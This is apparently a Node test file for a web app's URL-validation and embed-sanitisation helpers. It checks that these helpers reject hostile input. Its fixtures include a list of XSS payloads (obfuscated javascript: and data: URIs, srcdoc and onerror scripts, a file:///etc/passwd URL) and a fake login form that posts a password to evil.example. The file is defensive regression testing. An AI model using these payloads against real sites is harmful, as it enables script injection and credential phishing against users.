import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { after, before, test } from "node:test";
import { createServer } from "vite";

let server;
let safeUrl;
let embedSanitize;
let tweetEmbed;

before(async () => {
  server = await createServer({
    appType: "custom",
    logLevel: "silent",
    server: { middlewareMode: true },
  });
  safeUrl = await server.ssrLoadModule("/src/lib/utils/safe-url.ts");
  embedSanitize = await server.ssrLoadModule(
    "/src/lib/utils/embed-sanitize.ts",
  );
  tweetEmbed = await server.ssrLoadModule("/src/lib/utils/tweet-embed.ts");
});

after(async () => {
  await server?.close();
});

// the regression contract — `javascript:` reached `<audio
// src>`, `<iframe src>` and `<a href>` through `data-*` attributes, which
// DOMPurify does not apply its URI policy to. These are the encodings a
// `/^javascript:/i` blocklist would wave through and the WHATWG URL parser
// collapses back to `javascript:`, plus the schemes such a blocklist never
// thought about.
const HOSTILE_URLS = [
  "javascript:alert(document.domain)",
  "JaVaScRiPt:alert(1)",
  "  javascript:alert(1)",
  "\tjavascript:alert(1)",
  "\njavascript:alert(1)",
  "java\tscript:alert(1)",
  "java\nscript:alert(1)",
  "java\rscript:alert(1)",
  "\u0000javascript:alert(1)",
  // The  payload: `hostname` is `evil.example`, so a domain-based consent
  // check can be satisfied by a URL that never makes a network request.
  "javascript://evil.example/%0a%0aalert(document.domain)",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "data:text/html,<script>alert(1)</script>",
  "vbscript:msgbox(1)",
  "blob:https://free2z.cash/1234",
  "file:///etc/passwd",
  "about:blank",
  "chrome://settings",
  "jAvAsCrIpT:/*-/*`/*`/*'/*\"/**/(alert(1))//",
];

test("getSafeHttpUrl rejects every javascript: encoding, not just the literal one", () => {
  for (const url of HOSTILE_URLS) {
    assert.equal(
      safeUrl.getSafeHttpUrl(url),
      null,
      `hostile URL survived: ${JSON.stringify(url)}`,
    );
  }

  for (const value of [null, undefined, "", 0, {}, [], "not a url", "//host"]) {
    assert.equal(safeUrl.getSafeHttpUrl(value), null);
  }
});

test("tweet iframe URLs use only numeric status IDs on X hosts", () => {
  for (const url of [
    "https://x.com/alice/status/1234567890123456789?s=20",
    "https://twitter.com/i/web/status/1234567890123456789/photo/1",
    "https://www.twitter.com/alice/status/42",
  ]) {
    assert.equal(
      tweetEmbed.getTweetEmbedUrl(url),
      "https://platform.twitter.com/embed/Tweet.html?id=" +
        url.match(/status\/(\d+)/)?.[1] +
        "&dnt=true",
      url,
    );
  }

  assert.equal(
    tweetEmbed.getTweetEmbedUrl("https://x.com/alice/status/42", "dark"),
    "https://platform.twitter.com/embed/Tweet.html?id=42&dnt=true&theme=dark",
  );

  for (const url of [
    "https://x.com.evil.example/alice/status/42",
    "https://x.com/alice/status/../../evil",
    "https://x.com/alice/status/123456789012345678901",
    "https://example.com/alice/status/42",
    "not a url",
  ]) {
    assert.equal(tweetEmbed.getTweetEmbedUrl(url), null, url);
  }
});

test("getSafeHttpUrl returns the parsed href for real embed URLs", () => {
  assert.equal(
    safeUrl.getSafeHttpUrl("https://www.youtube.com/watch?v=q2fIWB8o-bs"),
    "https://www.youtube.com/watch?v=q2fIWB8o-bs",
  );
  assert.equal(
    safeUrl.getSafeHttpUrl("http://example.com"),
    "http://example.com/",
  );
  assert.equal(
    safeUrl.getSafeHttpUrl("https://open.spotify.com/track/abc"),
    "https://open.spotify.com/track/abc",
  );
});

test("getSafeMediaUrl admits same-origin upload paths and nothing hostile", () => {
  // PUBLIC_API_BASE_URL is empty whenever the API is same-origin, so a real
  // audio embed is frequently root-relative. Dropping those would silently
  // break every uploaded-audio zPage.
  assert.equal(
    safeUrl.getSafeMediaUrl("/uploadz/public/creator/example.mp3"),
    "/uploadz/public/creator/example.mp3",
  );
  assert.equal(
    safeUrl.getSafeMediaUrl("https://free2z.cash/uploadz/a.mp3"),
    "https://free2z.cash/uploadz/a.mp3",
  );

  for (const url of HOSTILE_URLS) {
    assert.equal(
      safeUrl.getSafeMediaUrl(url),
      null,
      `hostile URL survived: ${JSON.stringify(url)}`,
    );
  }

  // `/\host` and `//host` are authority delimiters to the URL parser, not
  // paths, so they must not be trusted as same-origin.
  assert.equal(safeUrl.getSafeMediaUrl("//evil.example/a.mp3"), null);
  assert.equal(safeUrl.getSafeMediaUrl("/\\evil.example/a.mp3"), null);
  assert.equal(safeUrl.getSafeMediaUrl("  /uploadz/a.mp3  "), "/uploadz/a.mp3");
});

const PAGE_ORIGIN = "https://free2z.cash";

function sanitize(html) {
  return embedSanitize.sanitizeEmbedHtml(html, PAGE_ORIGIN);
}

test("every surviving Iframely iframe is force-sandboxed", () => {
  const out = sanitize(
    '<div style="position:relative;padding-bottom:56.25%">' +
      '<iframe src="https://cdn.iframe.ly/abc" allowfullscreen></iframe>' +
      "</div>",
  );

  assert.match(out, /<iframe\b[^>]*\bsandbox="/);
  assert.match(out, /sandbox="[^"]*allow-scripts/);
  // cdn.iframe.ly is on the app's provider list, so it keeps storage access.
  assert.match(out, /sandbox="[^"]*allow-same-origin/);
  // The wrapper's layout styles must survive or every embed loses its aspect
  // ratio; the overlay risk they carry is contained by `contain: paint` on
  //.iframely-embed-shell, not by stripping them.
  assert.match(out, /padding-bottom:56\.25%/);
});

test("a sandbox in the provider response cannot widen ours", () => {
  const out = sanitize(
    '<iframe src="https://cdn.iframe.ly/abc" sandbox="allow-scripts allow-same-origin allow-top-navigation allow-downloads"></iframe>',
  );

  assert.equal((out.match(/sandbox=/g) || []).length, 1);
  assert.doesNotMatch(out, /allow-top-navigation/);
  assert.doesNotMatch(out, /allow-downloads/);
  assert.match(out, /sandbox="[^"]*allow-popups-to-escape-sandbox/);
});

test("an iframe pointing back at our own origin is dropped, not sandboxed", () => {
  // This is the case where `allow-scripts allow-same-origin` really is no
  // sandbox at all: a same-origin frame can reach parent.document and delete
  // its own sandbox attribute. The token set is unavoidable for real embeds,
  // so the same-origin frame is what has to go.
  for (const src of [
    "https://free2z.cash/settings",
    "/settings",
    "//free2z.cash/settings",
    "https://free2z.cash",
  ]) {
    const out = sanitize(`<iframe src="${src}"></iframe>`);
    assert.doesNotMatch(out, /<iframe/, `same-origin iframe survived: ${src}`);
  }
});

test("an iframe with no loadable cross-origin src is dropped", () => {
  for (const attributes of [
    "",
    'src=""',
    'src="javascript:alert(1)"',
    'src="data:text/html,<script>alert(1)</script>"',
    'srcdoc="<script>parent.document.body.remove()</script>"',
    'src="blob:https://evil.example/x"',
  ]) {
    const out = sanitize(`<iframe ${attributes}></iframe>`);
    assert.doesNotMatch(out, /<iframe/, `iframe survived: ${attributes}`);
  }
});

test("srcdoc never survives on an iframe that is otherwise loadable", () => {
  // srcdoc inherits the EMBEDDER's origin, which would turn allow-same-origin
  // into a real escape.
  const out = sanitize(
    '<iframe src="https://cdn.iframe.ly/abc" srcdoc="<script>alert(1)</script>"></iframe>',
  );

  assert.match(out, /<iframe/);
  assert.doesNotMatch(out, /srcdoc/);
});

test("allow= is trimmed to media features so an embed cannot borrow the reader's camera", () => {
  const out = sanitize(
    '<iframe src="https://cdn.iframe.ly/abc" allow="accelerometer; autoplay; camera; microphone; geolocation; encrypted-media; payment; usb; display-capture; picture-in-picture"></iframe>',
  );

  const allow = /allow="([^"]*)"/.exec(out)?.[1] ?? "";
  assert.match(allow, /autoplay/);
  assert.match(allow, /encrypted-media/);
  assert.match(allow, /picture-in-picture/);
  for (const denied of [
    "camera",
    "microphone",
    "geolocation",
    "payment",
    "usb",
    "display-capture",
    // Not a media capability: an embed that can rewrite the clipboard on a
    // "play" click can swap a Zcash address the reader is about to paste.
    "clipboard-write",
  ]) {
    assert.doesNotMatch(allow, new RegExp(denied), `${denied} was delegated`);
  }

  // A feature list with an allowlist target still resolves on the feature name.
  const targeted = sanitize(
    '<iframe src="https://cdn.iframe.ly/abc" allow="camera \'self\' https://evil.example"></iframe>',
  );
  assert.doesNotMatch(targeted, /allow=/);
});

test("scripts and event handlers never survive an embed response", () => {
  const out = sanitize(
    '<script>alert(1)</script><img src=x onerror="alert(1)">' +
      '<iframe src="https://cdn.iframe.ly/abc" onload="alert(1)"></iframe>',
  );

  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /onerror/i);
  assert.doesNotMatch(out, /onload/i);
});

test("a realistic provider payload still renders as an embed", () => {
  // Shape taken from a real cdn.iframe.ly response for a YouTube URL.
  const out = sanitize(
    '<div style="left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.25%;">' +
      '<iframe src="https://cdn.iframe.ly/api/iframe?url=https%3A%2F%2Fyoutu.be%2Fabc&key=k" ' +
      'style="top: 0; left: 0; width: 100%; height: 100%; position: absolute; border: 0;" ' +
      'allowfullscreen scrolling="no" allow="accelerometer *; clipboard-write *; encrypted-media *; gyroscope *; picture-in-picture *; web-share *;"></iframe>' +
      "</div>",
  );

  assert.match(out, /<iframe/);
  assert.match(out, /cdn\.iframe\.ly\/api\/iframe/);
  assert.match(out, /allowfullscreen/);
  assert.match(out, /position: absolute/);
  assert.match(out, /sandbox="allow-scripts/);
  assert.match(out, /sandbox="[^"]*allow-same-origin/);
  assert.doesNotMatch(out, /clipboard-write/);
});

test("an unrecognized host is sandboxed WITHOUT allow-same-origin", () => {
  // `allow-scripts allow-same-origin` is a full escape whenever the framed
  // document ends up same-origin with us, and checking `src` cannot rule that
  // out: the frame may answer 302 to https://free2z.cash/... after the check.
  // Unknown hosts therefore get an opaque origin, which makes such a redirect
  // worthless. Known providers (Iframely's own CDN included) keep storage.
  const hostile = sanitize(
    '<iframe src="https://evil.example/redirect"></iframe>',
  );
  assert.match(hostile, /<iframe/);
  assert.match(hostile, /sandbox="[^"]*allow-scripts/);
  assert.doesNotMatch(hostile, /allow-same-origin/);

  for (const src of [
    "https://cdn.iframe.ly/api/iframe?url=x",
    // Iframely hosts frames on BOTH domains; only one is in
    // EXTERNAL_EMBED_DOMAINS, and a hosted frame with an opaque origin renders
    // blank after the reader has already consented.
    "https://iframely.net/abc123",
    "https://cdn.iframely.net/abc123",
    "https://www.youtube.com/embed/abc",
    "https://open.spotify.com/embed/track/abc",
    "https://player.vimeo.com/video/1",
  ]) {
    const trusted = sanitize(`<iframe src="${src}"></iframe>`);
    assert.match(
      trusted,
      /allow-same-origin/,
      `a real provider lost storage access: ${src}`,
    );
  }
});

test("a <style> element never survives an embed response", () => {
  // The iframe sandbox, `contain: paint` and the height cap all bound a BOX.
  // A <style> is not in a box: its selectors are document-wide, so one
  // smuggled through a provider response can restyle our navigation or paint
  // a full-viewport notice, and production CSP allows inline styles. Nothing
  // Iframely returns needs one — its responsive wrapper uses `style=`
  // attributes, which stay allowed.
  const out = sanitize(
    "<div><style>html::after{content:'free2z is down';position:fixed;inset:0;background:red}</style>" +
      '<iframe src="https://cdn.iframe.ly/abc"></iframe></div>',
  );

  assert.doesNotMatch(out, /<style/i);
  assert.doesNotMatch(out, /free2z is down|position:fixed/i);
  //...while the embed itself is untouched.
  assert.match(out, /<iframe/);
  assert.match(out, /sandbox=/);

  // The style ATTRIBUTE that carries every embed's aspect ratio still works.
  assert.match(
    sanitize(
      '<div style="position:relative;padding-bottom:56.25%"><iframe src="https://cdn.iframe.ly/abc"></iframe></div>',
    ),
    /padding-bottom:56\.25%/,
  );
});

test("form controls never survive an embed response", () => {
  // A legitimate iframe=1&omit_script=1 response is a wrapper div and an
  // iframe. Form controls in OUR chrome are a credential-phishing surface
  // that needs no script and no iframe at all.
  const out = sanitize(
    '<form action="https://evil.example/steal" method="post">' +
      "<label>Free2Z session expired<input name=password type=password></label>" +
      "<button>Sign in</button><select><option>x</option></select>" +
      "<textarea></textarea></form>",
  );

  for (const tag of [
    "form",
    "input",
    "button",
    "select",
    "option",
    "textarea",
    "label",
  ]) {
    assert.doesNotMatch(out, new RegExp(`<${tag}`, "i"), `<${tag}> survived`);
  }
  assert.doesNotMatch(out, /evil\.example/);
});

test("MarkdownAudio validates the data-audio-url it is handed", async () => {
  // The sink for `data-audio-url`, which DOMPurify does not URL-filter.
  // Asserted against the source because the alternative is mounting Svelte in
  // node just to read two attributes.
  const source = await readFile(
    new URL("../src/lib/components/MarkdownAudio.svelte", import.meta.url),
    "utf8",
  );

  assert.match(source, /\$: safeSrc = getSafeMediaUrl\(src\)/);
  assert.match(source, /\{#if safeSrc\}/);
  assert.match(source, /src=\{safeSrc\}/);
  assert.match(source, /<a href=\{safeSrc\}>/);
  assert.doesNotMatch(
    source,
    /\{src\}|href=\{src\}|src=\{src\}/,
    "no live URL sink may read the raw src prop",
  );
});

test("MarkdownVideo validates the data-video-url it is handed", async () => {
  const source = await readFile(
    new URL("../src/lib/components/MarkdownVideo.svelte", import.meta.url),
    "utf8",
  );

  assert.match(source, /\$: safeSrc = getSafeMediaUrl\(src\)/);
  assert.match(source, /\{#if safeSrc\}/);
  assert.match(source, /<source src=\{safeSrc\}/);
  assert.doesNotMatch(
    source,
    /\{src\}|href=\{src\}|src=\{src\}/,
    "no live URL sink may read the raw src prop",
  );
});

// the regression contract and  — media routing needs an
// origin-aware predicate. The consent gate now withholds the entire live URL;
// MarkdownAudio still uses this helper as defence in depth if a later call site
// accidentally mounts third-party audio outside that gate.
test("isThirdPartyMediaUrl answers for the hosts audio actually comes from", () => {
  const origin = "https://free2z.cash";

  // Hosted uploads. `PUBLIC_API_BASE_URL` is "" in production, so this is what
  // the overwhelming majority of real audio embeds look like.
  assert.equal(safeUrl.isThirdPartyMediaUrl("/uploadz/a.mp3", origin), false);
  assert.equal(
    safeUrl.isThirdPartyMediaUrl("https://free2z.cash/uploadz/a.mp3", origin),
    false,
  );

  for (const url of [
    "https://tracker.example/probe.mp3",
    "http://tracker.example/probe.mp3",
    // A DIFFERENT PORT is a different origin, and so is a scheme downgrade.
    "https://free2z.cash:8443/uploadz/a.mp3",
    "http://free2z.cash/uploadz/a.mp3",
    // Protocol-relative: `startsWith("/")` alone reads this as our own path.
    "//tracker.example/probe.mp3",
    "/\\tracker.example/probe.mp3",
  ]) {
    assert.equal(
      safeUrl.isThirdPartyMediaUrl(url, origin),
      true,
      `treated as first party: ${JSON.stringify(url)}`,
    );
  }
});

test("isThirdPartyMediaUrl fails CLOSED when there is no page origin", () => {
  // SSR: `location` is undefined, so the component has no origin to compare
  // against. `isCrossOriginHttpUrl` would answer `false` here for every one of
  // these — `new URL(x, "")` throws even when `x` is absolute — and `false`
  // means "preload metadata", i.e. the beacon back.
  for (const pageOrigin of [null, "", undefined]) {
    assert.equal(
      safeUrl.isThirdPartyMediaUrl(
        "https://tracker.example/probe.mp3",
        pageOrigin,
      ),
      true,
    );
    // Our own absolute URL is over-classified as third party without an
    // origin. That costs a duration readout in a path that does not render
    // today; the opposite default costs the reader's IP.
    assert.equal(
      safeUrl.isThirdPartyMediaUrl(
        "https://free2z.cash/uploadz/a.mp3",
        pageOrigin,
      ),
      true,
    );
    // A root-relative URL is same-origin by construction, origin or not.
    assert.equal(
      safeUrl.isThirdPartyMediaUrl("/uploadz/a.mp3", pageOrigin),
      false,
    );
  }
});

test("MarkdownAudio decides preload per URL rather than pinning a literal", async () => {
  // Reading the source for the same reason the test above does. The proof that
  // no pre-consent request is made lives in the browser regression, where the
  // third party's own hit counter can be observed. This guards the fallback
  // used if another caller ever mounts MarkdownAudio without the gate.
  const source = await readFile(
    new URL("../src/lib/components/MarkdownAudio.svelte", import.meta.url),
    "utf8",
  );

  assert.match(source, /preload=\{preloadStrategy\}/);
  assert.match(source, /isThirdPartyMediaUrl\(safeSrc, pageOrigin\)/);
  assert.match(
    source,
    /typeof location === "undefined" \? null : location\.origin/,
  );
});

test("MarkdownContent routes third-party direct media through ExternalEmbed", async () => {
  const source = await readFile(
    new URL("../src/lib/components/MarkdownContent.svelte", import.meta.url),
    "utf8",
  );
  const externalEmbed = await readFile(
    new URL("../src/lib/components/ExternalEmbed.svelte", import.meta.url),
    "utf8",
  );

  assert.match(
    source,
    /isThirdPartyMediaUrl\(\s*safeSrc,\s*window\.location\.origin,?\s*\)/,
  );
  assert.match(source, /mediaType: "audio"/);
  assert.match(source, /mediaType: "video"/);
  assert.match(externalEmbed, /mediaType === "audio"/);
  assert.match(externalEmbed, /mediaType === "video"/);
  assert.match(externalEmbed, /<MarkdownAudio src=\{safeUrl\}/);
  assert.match(externalEmbed, /<MarkdownVideo src=\{safeUrl\}/);
});
